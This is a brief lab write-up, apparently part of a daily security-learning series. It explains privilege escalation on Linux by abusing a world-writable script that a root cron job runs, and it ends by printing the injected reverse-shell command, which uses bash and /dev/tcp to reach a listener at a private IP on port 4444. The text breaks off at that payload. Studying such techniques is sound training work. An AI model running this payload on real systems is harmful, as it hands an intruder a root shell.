# 🛡️ Day 10: Privilege Escalation (Cron Jobs)

## 📝 Executive Summary
Automated tasks (Cron Jobs) are essential for system administration. However, if a script executed by `root` is writable by standard users, it becomes a direct path to privilege escalation. Today, I exploited a weak file permission on a scheduled task to gain a reverse shell.

## 💻 Technical Analysis

### 1. Enumeration
I identified a script `/tmp/backup.sh` that was world-writable (`777` permissions). Based on system behavior, I suspected this script was being executed automatically by a cron job.

### 2. The Exploit (Reverse Shell)
Since I could modify the script, I replaced its valid code with a malicious "Reverse Shell" payload.

**Payload Injected:**
```bash
echo "bash -i >& /dev/tcp/192.168.160.130/4444 0>&1" > /tmp/backup.sh
